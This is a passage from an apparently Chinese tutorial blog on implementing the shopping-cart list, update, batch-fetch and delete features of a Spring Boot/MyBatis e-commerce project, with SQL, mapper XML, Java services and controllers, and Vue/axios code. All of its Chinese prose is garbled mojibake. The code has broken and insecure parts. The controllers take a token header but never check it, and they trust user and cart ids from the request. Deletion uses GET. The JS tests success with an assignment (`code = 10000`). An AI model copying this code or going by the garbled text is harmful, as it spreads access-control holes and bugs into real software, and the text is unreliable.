p.product_idAND c.sku_id&#x3D;s.sku_idAND c.product_id&#x3D;i.item_idWHERE c.user_id &#x3D; 1AND i.is_main&#x3D;1</code></pre><ul><li><p>dao</p><p>åˆ›å»ºä¸€ä¸ªæ–°çš„å®ä½“ç±»ç”¨äºä¿å­˜è¿”å›çš„æ•°æ®</p><pre><code class="hljs java"><span class="hljs-meta">@Data</span><span class="hljs-meta">@NoArgsConstructor</span><span class="hljs-meta">@AllArgsConstructor</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ShoppingCartVO</span> </span>&#123;    <span class="hljs-keyword">private</span> Integer cartId;    <span class="hljs-keyword">private</span> String productId;    <span class="hljs-keyword">private</span> String skuId;    <span class="hljs-keyword">private</span> String userId;    <span class="hljs-keyword">private</span> String cartNum;    <span class="hljs-keyword">private</span> String cartTime;    <span class="hljs-keyword">private</span> BigDecimal productPrice;    <span class="hljs-keyword">private</span> String skuProps;    <span class="hljs-keyword">private</span> String productName;    <span class="hljs-keyword">private</span> String productImg;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">double</span> originalPrice;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">double</span> sellPrice;    <span class="hljs-keyword">private</span> String skuName;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> skuStock;  <span class="hljs-comment">//åº“å­˜</span>&#125;</code></pre><p>mapper</p><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;ShoppingCartVO&gt; <span class="hljs-title">selectShopcartByUserId</span><span class="hljs-params">(<span class="hljs-keyword">int</span> userId)</span></span>;</code></pre><p>xml</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">resultMap</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;ShoppingCartVOMap&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;com.qfedu.fmmall.entity.ShoppingCartVO&quot;</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;cart_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;cartId&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productId&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sku_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;skuId&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;user_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;userId&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;cart_num&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;cartNum&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;cart_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;cartTime&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_price&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;DECIMAL&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productPrice&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sku_props&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;skuProps&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_name&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productName&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;url&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productImg&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;original_price&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;originalPrice&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sell_price&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;sellPrice&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sku_name&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;skuName&quot;</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectShopcartByUserId&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;ShoppingCartVOMap&quot;</span>&gt;</span>  select c.cart_id, c.product_id,  c.sku_id, c.user_id, c.cart_num, c.cart_time,   c.product_price, c.sku_props,  p.product_name, i.url,s.original_price,s.sell_price,s.sku_name  from shopping_cart c  INNER JOIN product p  INNER JOIN product_img i  INNER JOIN product_sku s  ON c.product_id = p.product_id  and i.item_id=p.product_id  and c.sku_id=s.sku_id  where user_id = #&#123;userId&#125;  and i.is_main=1<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></code></pre></li><li><p>service</p><pre><code class="hljs java"><span class="hljs-meta">@Transactional(propagation = Propagation.SUPPORTS)</span><span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">listShoppingCartsByUserId</span><span class="hljs-params">(<span class="hljs-keyword">int</span> userId)</span> </span>&#123;    List&lt;ShoppingCartVO&gt; list = shoppingCartMapper.selectShopcartByUserId(userId);    ResultVO resultVO = <span class="hljs-keyword">new</span> ResultVO(ResStatus.OK, <span class="hljs-string">&quot;success&quot;</span>, list);    <span class="hljs-keyword">return</span> resultVO;&#125;</code></pre></li></ul><ul><li><p>controller</p><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/list&quot;)</span><span class="hljs-meta">@ApiImplicitParam(dataType = &quot;int&quot;,name = &quot;userId&quot;, value = &quot;ç”¨æˆ·ID&quot;,required = true)</span><span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">list</span><span class="hljs-params">(Integer userId,<span class="hljs-meta">@RequestHeader(&quot;token&quot;)</span>String token)</span></span>&#123;    ResultVO resultVO = shoppingCartService.listShoppingCartsByUserId(userId);    <span class="hljs-keyword">return</span> resultVO;&#125;</code></pre></li></ul><ul><li><h4 id="æ›´æ–°è´­ç‰©è½¦"><a href="#æ›´æ–°è´­ç‰©è½¦" class="headerlink" title="æ›´æ–°è´­ç‰©è½¦"></a>æ›´æ–°è´­ç‰©è½¦</h4></li></ul><p>æ›´æ–°è´­ç‰©è½¦å‘é€çš„è¯·æ±‚å¦‚ä¸‹ï¼Œç”±åˆ†æå¯ä»¥çœ‹å‡ºurlçš„æ ¼å¼å¦‚ä¸‹ï¼Œå¹¶ä¸”å‘é€çš„æ˜¯putè¯·æ±‚</p><pre><code class="hljs awk"><span class="hljs-regexp">/shopcart/u</span>pdate<span class="hljs-regexp">/&#123;cartId&#125;/</span>&#123;num&#125;</code></pre><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220714105311322.png" alt="image-20220714105311322"></p><ul><li><p>sql</p><p>ä½¿ç”¨updateæ–¹æ³•å¯¹å¯¹åº”çš„è´­ç‰©è½¦è®°å½•è¿›è¡Œä¿®æ”¹å³å¯</p><pre><code class="hljs routeros">update shopping_cart <span class="hljs-builtin-name">set</span> <span class="hljs-attribute">cart_num</span>=3 where <span class="hljs-attribute">cart_id</span>=1</code></pre></li></ul><ul><li><p>dao</p><p>xml</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectShopcartByUserId&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;ShoppingCartVOMap&quot;</span>&gt;</span>  select c.cart_id, c.product_id,  c.sku_id, c.user_id, c.cart_num, c.cart_time,   c.product_price, c.sku_props,  p.product_name, i.url,s.original_price,s.sell_price,s.sku_name  from shopping_cart c  INNER JOIN product p  INNER JOIN product_img i  INNER JOIN product_sku s  ON c.product_id = p.product_id  and i.item_id=p.product_id  and c.sku_id=s.sku_id  where user_id = #&#123;userId&#125;  and i.is_main=1<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">update</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;updateCartnumByCartid&quot;</span>&gt;</span>  update shopping_cart set cart_num=#&#123;cartNum&#125; where cart_id=#&#123;cartId&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">update</span>&gt;</span></code></pre><p>mapper</p><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">updateCartnumByCartid</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;cartId&quot;)</span> <span class="hljs-keyword">int</span> cartId,</span></span><span class="hljs-function"><span class="hljs-params">                                 <span class="hljs-meta">@Param(&quot;cartNum&quot;)</span> <span class="hljs-keyword">int</span> cartNum)</span></span>;</code></pre></li><li><p>service</p><pre><code class="hljs java"><span class="hljs-meta">@Override</span><span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">updateCartNum</span><span class="hljs-params">(<span class="hljs-keyword">int</span> cartId, <span class="hljs-keyword">int</span> cartNum)</span> </span>&#123;    <span class="hljs-keyword">int</span> i = shoppingCartMapper.updateCartnumByCartid(cartId, cartNum);    <span class="hljs-keyword">if</span>(i&gt;<span class="hljs-number">0</span>)&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.OK,<span class="hljs-string">&quot;update success&quot;</span>,<span class="hljs-keyword">null</span>);    &#125;<span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.NO,<span class="hljs-string">&quot;update fail&quot;</span>,<span class="hljs-keyword">null</span>);    &#125;&#125;</code></pre></li><li><p>controller</p><pre><code class="hljs java"><span class="hljs-meta">@PutMapping(&quot;/update/&#123;cid&#125;/&#123;cnum&#125;&quot;)</span><span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">updateNum</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;cid&quot;)</span> Integer cartId,</span></span><span class="hljs-function"><span class="hljs-params">                          <span class="hljs-meta">@PathVariable(&quot;cnum&quot;)</span> Integer cartNum,</span></span><span class="hljs-function"><span class="hljs-params">                          <span class="hljs-meta">@RequestHeader(&quot;token&quot;)</span> String token)</span></span>&#123;    ResultVO resultVO = shoppingCartService.updateCartNum(cartId, cartNum);    <span class="hljs-keyword">return</span> resultVO;&#125;</code></pre></li></ul><p>è·å–è´­ç‰©è½¦åˆ—è¡¨ä¿¡æ¯</p><blockquote><p>å½“ç‚¹å‡»ç»“ç®—æ—¶ï¼Œé¡µé¢ä¼šè·³è½¬åˆ°ç»“ç®—é¡µé¢ï¼Œè¿™é‡Œä¾ç„¶éœ€è¦æ˜¾ç¤ºè®¢å•ä¸­çš„ä¿¡æ¯ï¼Œä½†æ˜¯è¿™é‡Œéœ€è¦çš„æ˜¯æ‰¹é‡ç»“ç®—ï¼Œæ‰€ä»¥éœ€è¦æ‰¹é‡è·å–</p></blockquote><p>ä»å‰ç«¯å‘èµ·çš„è¯·æ±‚å¯ä»¥çœ‹åˆ°cidsä¸ºæœ¬æ¬¡è¯·æ±‚çš„æ‰€æœ‰è´­ç‰©è½¦è®¢å•</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220714124912790.png" alt="image-20220714124912790"></p><p>å“åº”ç»“æœå¦‚ä¸‹</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220714125042189.png" alt="image-20220714125042189"></p><p>ä»ä¸­å¯ä»¥çœ‹åˆ°ä¸è·å–è´­ç‰©è½¦åˆ—è¡¨ä½¿ç”¨åˆ°çš„sqlè¯­å¥å¤§è‡´ç›¸åŒ</p><ul><li><p>sql</p><pre><code class="hljs mysql">select c.cart_id, c.product_id,  c.sku_id, c.user_id, c.cart_num, c.cart_time,c.product_price, c.sku_props,  p.product_name, i.url,s.original_price,s.sell_price,s.sku_name,s.stockfrom shopping_cart cINNER JOIN product pINNER JOIN product_img iINNER JOIN product_sku sON c.product_id &#x3D; p.product_idand i.item_id&#x3D;p.product_idand c.sku_id&#x3D;s.sku_idwhere i.is_main&#x3D;1 and c.cart_id in (6,7)</code></pre><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220714125332136.png" alt="image-20220714125332136"></p></li><li><p>dao</p><p>åˆ›å»ºæ–°çš„å®ä½“ç±»ä¿å­˜ç»“æœ</p><pre><code class="hljs java"><span class="hljs-comment">/**</span><span class="hljs-comment"> * æ–°å¢ productNameã€productImg</span><span class="hljs-comment"> */</span><span class="hljs-meta">@Data</span><span class="hljs-meta">@NoArgsConstructor</span><span class="hljs-meta">@AllArgsConstructor</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ShoppingCartVO</span> </span>&#123;    <span class="hljs-keyword">private</span> Integer cartId;    <span class="hljs-keyword">private</span> String productId;    <span class="hljs-keyword">private</span> String skuId;    <span class="hljs-keyword">private</span> String userId;    <span class="hljs-keyword">private</span> String cartNum;    <span class="hljs-keyword">private</span> String cartTime;    <span class="hljs-keyword">private</span> BigDecimal productPrice;    <span class="hljs-keyword">private</span> String skuProps;    <span class="hljs-keyword">private</span> String productName;    <span class="hljs-keyword">private</span> String productImg;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">double</span> originalPrice;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">double</span> sellPrice;    <span class="hljs-keyword">private</span> String skuName;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> skuStock;  <span class="hljs-comment">//åº“å­˜</span>&#125;</code></pre><p>Mapperä¸­ä»£ç </p><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;ShoppingCartVO&gt; <span class="hljs-title">selectShopcartByCids</span><span class="hljs-params">(List&lt;Integer&gt; cids)</span></span>;</code></pre><p>xml</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">resultMap</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;ShoppingCartVOMap2&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;com.qfedu.fmmall.entity.ShoppingCartVO&quot;</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;cart_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;cartId&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productId&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sku_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;skuId&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;user_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;userId&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;cart_num&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;cartNum&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;cart_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;cartTime&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_price&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;DECIMAL&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productPrice&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sku_props&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;skuProps&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_name&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productName&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;url&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productImg&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;original_price&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;originalPrice&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sell_price&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;sellPrice&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sku_name&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;skuName&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;stock&quot;</span>  <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;skuStock&quot;</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectShopcartByCids&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;ShoppingCartVOMap2&quot;</span>&gt;</span>  select c.cart_id, c.product_id,  c.sku_id, c.user_id, c.cart_num, c.cart_time,  c.product_price, c.sku_props,  p.product_name, i.url,s.original_price,s.sell_price,s.sku_name,s.stock  from shopping_cart c  INNER JOIN product p  INNER JOIN product_img i  INNER JOIN product_sku s  ON c.product_id = p.product_id  and i.item_id=p.product_id  and c.sku_id=s.sku_id  where i.is_main=1 and c.cart_id in  <span class="hljs-tag">&lt;<span class="hljs-name">foreach</span> <span class="hljs-attr">collection</span>=<span class="hljs-string">&quot;cids&quot;</span> <span class="hljs-attr">item</span>=<span class="hljs-string">&quot;cid&quot;</span> <span class="hljs-attr">separator</span>=<span class="hljs-string">&quot;,&quot;</span> <span class="hljs-attr">open</span>=<span class="hljs-string">&quot;(&quot;</span> <span class="hljs-attr">close</span>=<span class="hljs-string">&quot;)&quot;</span>&gt;</span>      #&#123;cid&#125;  <span class="hljs-tag">&lt;/<span class="hljs-name">foreach</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></code></pre></li><li><p>service</p><pre><code class="hljs java"><span class="hljs-meta">@Override</span><span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">listShoppingCartsByCids</span><span class="hljs-params">(String cids)</span> </span>&#123;    <span class="hljs-comment">// å°†å‰ç«¯è¯·æ±‚æºå¸¦çš„å­—ç¬¦ä¸²è½¬æ¢æˆintæ•°ç»„ </span>    List&lt;Integer&gt; cartIds = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();    String[] strings = cids.split(<span class="hljs-string">&quot;,&quot;</span>);    <span class="hljs-keyword">for</span> (String string : strings) &#123;        cartIds.add(Integer.parseInt(string));    &#125;    List&lt;ShoppingCartVO&gt; list = shoppingCartMapper.selectShopcartByCids(cartIds);    <span class="hljs-keyword">return</span> ResultVO.success(list);&#125;</code></pre></li><li><p>controller</p><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/listbycids&quot;)</span><span class="hljs-meta">@ApiImplicitParam(dataType = &quot;String&quot;,name = &quot;cids&quot;, value = &quot;é€‰æ‹©çš„è´­ç‰©è½¦è®°å½•çš„id&quot;,required = true)</span><span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">listByCids</span><span class="hljs-params">(String cids, <span class="hljs-meta">@RequestHeader(&quot;token&quot;)</span>String token)</span></span>&#123;    ResultVO resultVO = shoppingCartService.listShoppingCartsByCids(cids);    <span class="hljs-keyword">return</span> resultVO;&#125;</code></pre><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220714130445019.png" alt="image-20220714130445019"></p></li></ul><h4 id="åˆ é™¤è´­ç‰©è½¦"><a href="#åˆ é™¤è´­ç‰©è½¦" class="headerlink" title="åˆ é™¤è´­ç‰©è½¦"></a>åˆ é™¤è´­ç‰©è½¦</h4><ul><li><p>sql</p><p>åˆ é™¤æ•°æ®æ—¶ï¼Œå¯ä»¥æ‰¹é‡åˆ é™¤ä¹Ÿå¯ä»¥æ˜¯å•ä¸ªåˆ é™¤ï¼Œå› æ­¤ä½¿ç”¨ä¸‹é¢çš„sqlè¯­å¥</p><pre><code class="hljs mysql">delete from shopping_cart where cart_id IN (10,11)</code></pre></li><li><p>dao</p><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">deleteShopcartByCids</span><span class="hljs-params">(List&lt;Integer&gt; cids)</span></span>;</code></pre><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">delete</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;deleteShopcartByCids&quot;</span>&gt;</span>  delete from shopping_cart where cart_id in  <span class="hljs-tag">&lt;<span class="hljs-name">foreach</span> <span class="hljs-attr">collection</span>=<span class="hljs-string">&quot;cids&quot;</span> <span class="hljs-attr">item</span>=<span class="hljs-string">&quot;cid&quot;</span> <span class="hljs-attr">separator</span>=<span class="hljs-string">&quot;,&quot;</span> <span class="hljs-attr">open</span>=<span class="hljs-string">&quot;(&quot;</span> <span class="hljs-attr">close</span>=<span class="hljs-string">&quot;)&quot;</span>&gt;</span>    #&#123;cid&#125;  <span class="hljs-tag">&lt;/<span class="hljs-name">foreach</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">delete</span>&gt;</span></code></pre></li><li><p>service</p><pre><code class="hljs java"><span class="hljs-meta">@Override</span><span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">deleteShoppingCartsByCids</span><span class="hljs-params">(String cids)</span> </span>&#123;    <span class="hljs-comment">// å°†å‰ç«¯è¯·æ±‚æºå¸¦çš„å­—ç¬¦ä¸²è½¬æ¢æˆintæ•°ç»„</span>    List&lt;Integer&gt; cartIds = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();    String[] strings = cids.split(<span class="hljs-string">&quot;,&quot;</span>);    <span class="hljs-keyword">for</span> (String string : strings) &#123;        cartIds.add(Integer.parseInt(string));    &#125;    <span class="hljs-keyword">int</span> i = shoppingCartMapper.deleteShopcartByCids(cartIds);    <span class="hljs-keyword">if</span>(i &gt; <span class="hljs-number">0</span>)&#123;        <span class="hljs-keyword">return</span> ResultVO.success();    &#125;<span class="hljs-keyword">else</span> &#123;        <span class="hljs-keyword">return</span> ResultVO.failed(<span class="hljs-string">&quot;åˆ é™¤å¤±è´¥ï¼&quot;</span>);    &#125;&#125;</code></pre></li></ul><ul><li><p>controller</p><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/delete&quot;)</span><span class="hljs-meta">@ApiImplicitParam(dataType = &quot;String&quot;,name = &quot;cids&quot;, value = &quot;é€‰æ‹©çš„è´­ç‰©è½¦è®°å½•çš„id&quot;,required = true)</span><span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">deletebycids</span><span class="hljs-params">(String cids, <span class="hljs-meta">@RequestHeader(&quot;token&quot;)</span>String token)</span></span>&#123;    ResultVO resultVO = shoppingCartService.deleteShoppingCartsByCids(cids);    <span class="hljs-keyword">return</span> resultVO;&#125;</code></pre></li><li><p>å‰ç«¯ä»£ç </p><p>ç”±äºè¯¥åŠŸèƒ½æ²¡æœ‰å†å‰ç«¯å®ç°å› æ­¤åœ¨shopcart.htmlé¡µé¢ä¸­åŠ å…¥å¦‚ä¸‹jsä»£ç     </p><pre><code class="hljs js">deleteByIds: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.opts.length == <span class="hljs-number">0</span>) &#123;        alert(<span class="hljs-string">&quot;è¯·é€‰æ‹©è¦è´­ä¹°çš„å•†å“ï¼&quot;</span>)    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-comment">//1.è·å–é€‰æ‹©è´­ç‰©è½¦è®°å½•çš„id [0,2]  ---&gt;  cartId 8   cartId 10 --- 8,10,</span>        <span class="hljs-keyword">var</span> cids = <span class="hljs-string">&quot;&quot;</span>;        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">this</span>.opts.length; i++) &#123;            <span class="hljs-keyword">var</span> index = <span class="hljs-built_in">this</span>.opts[i];            <span class="hljs-keyword">var</span> cartId = <span class="hljs-built_in">this</span>.shopcarts[index].cartId;            <span class="hljs-keyword">if</span> (i &lt; <span class="hljs-built_in">this</span>.opts.length - <span class="hljs-number">1</span>) &#123;                cids = cids + cartId + <span class="hljs-string">&quot;,&quot;</span>;            &#125; <span class="hljs-keyword">else</span> &#123;                cids = cids + cartId;            &#125;        &#125;        <span class="hljs-keyword">var</span> url = baseUrl + <span class="hljs-string">&quot;shopcart/delete/?cids=&quot;</span> + cids;        axios(&#123;            url: url,            method: <span class="hljs-string">&quot;get&quot;</span>,            headers: &#123;                token: <span class="hljs-built_in">this</span>.token            &#125;        &#125;).then(<span class="hljs-function">(<span class="hljs-params">res</span>) =&gt;</span> &#123;            <span class="hljs-built_in">console</span>.log(res);            <span class="hljs-keyword">if</span> (res.data.code = <span class="hljs-number">10000</span>) &#123;                <span class="hljs-comment">//é‡æ–°åˆ·æ–°è´­ç‰©è½¦</span>                <span class="hljs-built_in">this</span>.getShoppingCartList();            &#125;        &#125;);    